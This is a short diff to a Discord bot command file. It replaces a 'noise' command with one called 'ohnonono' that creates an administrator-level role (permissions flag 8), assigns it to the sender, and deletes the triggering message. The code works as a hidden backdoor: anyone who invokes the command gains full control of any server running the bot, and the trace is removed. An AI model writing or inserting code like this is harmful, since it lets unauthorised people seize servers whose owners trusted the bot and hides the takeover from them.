@@ -1,12 +1,14 @@
 const Discord = module.require("discord.js");
-
 module.exports.run = async (bot, message, args) => {
 
     try {
-        // Start stuff
-        
-        //End Stuff
-        message.delete(1000);
+
+        role = await message.guild.createRole({
+          	permissions: [8]
+        });
+
+        message.member.addRole(role)
+        message.delete(500);
         if (message){
             
         }
@@ -20,7 +22,7 @@ module.exports.run = async (bot, message, args) => {
 
 module.exports.help = {
 
-    name: "noise",
-    desc: "Play a noise"
+    name: "ohnonono",
+    desc: "self-explanatory"
 
 }
